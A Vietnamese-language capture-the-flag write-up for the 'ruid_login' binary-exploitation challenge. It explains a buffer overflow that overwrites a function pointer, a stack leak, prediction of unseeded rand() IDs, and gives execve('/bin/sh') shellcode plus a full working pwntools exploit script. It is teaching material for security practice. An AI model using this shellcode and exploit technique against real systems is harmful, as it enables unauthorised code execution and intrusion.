# ruid_login---Write-up-----Scarlet

Hướng dẫn cách giải bài ruid_login cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 12/1/2026

## 1. Mục tiêu cần làm
Đầu tiên là xem các lớp bảo vệ của bài này đã

<img width="569" height="177" alt="image" src="https://github.com/user-attachments/assets/62b3b3b2-805a-497b-bdc2-5a3db184e77e" />

Ôi la la. Thấy **NX unknown** là bú rồi đó, chưa kể còn **Stack Executable**. Bài này không shellcode hơi phí.

Đọc hiểu code

```C
unsigned __int64 setup_users()
{
  int i; // [rsp+Ch] [rbp-34h]
  char *src[2]; // [rsp+10h] [rbp-30h]
  __int64 v3[3]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  src[0] = "Professor";
  src[1] = "Dean";
  v3[0] = (__int64)prof;
  v3[1] = (__int64)dean;
  for ( i = 0; i <= 1; ++i )
  {
    strcpy((char *)&users + 48 * i, src[i]);
    qword_4108[6 * i] = rand();
    *((_QWORD *)&unk_4100 + 6 * i) = v3[i];
  }
  return v4 - __readfsqword(0x28u);
}
```

Ta thấy lúc mới khởi tạo thì `users[0]` đã được gán tên Professor, `users[1]` được gán tên là Dean. Bên cạnh đó thì `unk_4100` cũng được gán lần lượt là 2 con trỏ để trỏ vào đó. Ta sẽ chạy thử hàm này và xem `users` được sắp xếp như nào.

<img width="986" height="150" alt="image" src="https://github.com/user-attachments/assets/509eff34-5d6d-4376-8c4e-29a51d723b8e" />

Ngay tại `users 32` chính là con trỏ của Professor và `users 80` là Dean.

<img width="989" height="349" alt="image" src="https://github.com/user-attachments/assets/87dd4af1-9e8e-4382-9677-78a1810459be" />

Có 1 lỗi Buffer Overflow ở hàm `dean`

```C
unsigned __int64 dean()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Change a staff member's name!");
  list_ruids();
  if ( (unsigned int)get_number(&v1, 2LL) )
  {
    printf("New name: ");
    read(0, (char *)&users + 48 * v1, 41uLL);
  }
  return v2 - __readfsqword(0x28u);
}
```

Nó cho phép ta chọn `users` 0 hoặc 1 để sửa. Nhưng thay vì chỉ cho sửa tối đa 32 byte để phòng tránh đè lên con trỏ thì nó cho ta sửa hẳn 41 byte ( quá hào phóng ). Vậy là chỉ cần chọn `users[0]` và ghi đè con trỏ tới Professor là xong. Khi ta gọi Professor thì nó sẽ thực thi lệnh

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-60h]
  int i; // [rsp+4h] [rbp-5Ch]
  __int64 v6; // [rsp+8h] [rbp-58h] BYREF
  __int64 buf[10]; // [rsp+10h] [rbp-50h] BYREF

  buf[9] = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setup_users();
  puts("Welcome to Rutgers University!");
  printf("Please enter your netID: ");
  memset(buf, 0, 64);
  read(0, buf, 0x40uLL);
  *((_BYTE *)buf + strcspn((const char *)buf, "\n")) = 0;
  printf("Accessing secure interface as netid '%s'\n", (const char *)buf);
  while ( !feof(stdin) )
  {
    list_ruids();
    printf("Please enter your RUID: ");
    __isoc23_scanf("%lu%*c", &v6);
    printf("Logging in as RUID %lu..\n", v6);
    v4 = 0;
    for ( i = 0; i <= 1; ++i )
    {
      if ( qword_4108[6 * i] == v6 )
      {
        putchar(10);
        printf("Welcome, %s!\n", (const char *)&users + 48 * i);
        (*((void (**)(void))&unk_4100 + 6 * i))();                 # thực thi con trỏ tại Professor
        putchar(10);
        v4 = 1;
      }
    }
    if ( !v4 )
      puts("No match!");
  }
  return 0;
}
```

Ok bắt tay vô băm thôi !

## 2. Cách thực thi
Đầu tiên cần leak được Stack để ta có thể thay đổi con trỏ của Professor thành vị trí trên Stack. Ta sẽ vứt shellcode vô đầu buf để khi trỏ về nó sẽ thực thi shellcode của ta.

À quên nhắc là bài này không có Dockerfile, 1 số phiên bản sẽ không thể leak Stack được nhưng may mà phiên bản mình trùng với phiên bản server ( chúa phù hộ con ).

<img width="770" height="154" alt="image" src="https://github.com/user-attachments/assets/e8bf6f40-89e7-4680-9645-f40f555a9612" />

Đây là từ buf đến saved RIP ( là libc ). Khúc này nó cho mình nhập được 64 byte, vừa đủ để leak stack luôn. Stack nó là `0x00007fffffffdfa0`. Tiện thể mình nhét luôn shellcode vào trong buf luôn cho tiện.

```Python
shellcode = asm("""
    /* sub rsp, 0x200 (tránh shellcode tự đè lên chính nó) */
    push 2
    pop rax
    shl rax, 8
    sub rsp, rax
    
    /* execve("/bin/sh", 0, 0) */
    xor rsi, rsi
    xor rdx, rdx
    mov rbx, 0x68732f6e69622f2f
    shr rbx, 8
    push rbx
    mov rdi, rsp
    push 59
    pop rax
    syscall
""")

# ĐẢM BẢO CHÍNH XÁC 64 BYTES
payload_netid = shellcode.ljust(64, b"A")

p.sendafter(b"Please enter your netID: ", payload_netid)

# 3. Leak địa chỉ Stack
p.recvuntil(b"as netid '")
p.recv(64) # Nhận đúng 64 byte đã gửi
leak = p.recv(6)
stack_leak = u64(leak.ljust(8, b"\x00"))
log.success(f"Leaked Stack: {hex(stack_leak)}")
```

Cái execve thì quá đơn giản rồi, nó là shellcode mẫu luôn. Còn `sub rsp` thì khi ta quay lại buf, rsp sẽ trỏ vào buf. Khi thực thi execve thì có nguy cơ rsp sẽ trỏ lại vào shellcode, khiến nó bị lặp lại. Nên mình đã trỏ nó cách shellcode ra 1 vùng thật xa để tránh trường hợp đó. Các bạn có thể thay là 0x360 cũng được 🐧.

Giờ đã có Stack, ta có thể tính được vị trí của buf.

```Python
shellcode_addr = stack_leak - 0x130
log.info(f"Target Jump: {hex(shellcode_addr)}")
```

Tiếp theo là tìm được ID của Dean và Professor. Vẫn là hàm `setup_users`, nó có 1 dòng là `qword_4108[6 * i] = rand();`. Tức là 2 cái ID này là random, nhưng hên là nó là `rand()` chứ không phải `srand()`. Vì là `rand()` nên các bạn có thể lấy được luôn chỉ với 3 dòng.

```Python
libc = CDLL("libc.so.6")
ruid_prof = libc.rand()
ruid_dean = libc.rand()

log.info(f"RUID Professor: {ruid_prof}")
log.info(f"RUID Dean: {ruid_dean}")
```

Sau khi có ID thì đầu tiên là vô thằng `dean` trước để sửa `users[0]` thành stack.

```Python
p.sendlineafter(b"Please enter your RUID: ", str(ruid_dean).encode())
p.sendlineafter(b"Num: ", b"0")      # chọn users 0

payload_overwrite = b"A" * 32 + p64(shellcode_addr)
p.sendafter(b"New name: ", payload_overwrite)
```

Và sau khi sửa xong thì ta chỉ cần đăng nhập ID của thằng Professor là xong.

```Python
p.sendlineafter(b"Please enter your RUID: ", str(ruid_prof).encode())

p.interactive()
```

Bùm nổ shell !!!

<img width="378" height="252" alt="image" src="https://github.com/user-attachments/assets/06aa4594-02f3-4dc0-aa24-443f2ff0b5e9" />

Bài này cũng ở mức easy thôi, không quá khó. Thôi thì cho mình 1 star để có động lực viết tiếp nha 🐧.

## 3. Exploit

```Python
from pwn import *
from ctypes import CDLL

context.arch = 'amd64'
p = process('./ruid_login')
#p = remote('challs.ctf.rusec.club', 4622)

libc = CDLL("libc.so.6")
ruid_prof = libc.rand()
ruid_dean = libc.rand()

log.info(f"RUID Professor: {ruid_prof}")
log.info(f"RUID Dean: {ruid_dean}")

shellcode = asm("""
    /* sub rsp, 0x200 (tránh shellcode tự đè lên chính nó) */
    push 2
    pop rax
    shl rax, 8
    sub rsp, rax
    
    /* execve("/bin/sh", 0, 0) */
    xor rsi, rsi
    xor rdx, rdx
    mov rbx, 0x68732f6e69622f2f
    shr rbx, 8
    push rbx
    mov rdi, rsp
    push 59
    pop rax
    syscall
""")

payload_netid = shellcode.ljust(64, b"A")

p.sendafter(b"Please enter your netID: ", payload_netid)

p.recvuntil(b"as netid '")
p.recv(64) # Nhận đúng 64 byte đã gửi
leak = p.recv(6)
stack_leak = u64(leak.ljust(8, b"\x00"))
log.success(f"Leaked Stack: {hex(stack_leak)}")

shellcode_addr = stack_leak - 0x130
log.info(f"Target Jump: {hex(shellcode_addr)}")

p.sendlineafter(b"Please enter your RUID: ", str(ruid_dean).encode())
p.sendlineafter(b"Num: ", b"0")

payload_overwrite = b"A" * 32 + p64(shellcode_addr)

pause()

p.sendafter(b"New name: ", payload_overwrite)

p.sendlineafter(b"Please enter your RUID: ", str(ruid_prof).encode())

p.interactive()
```
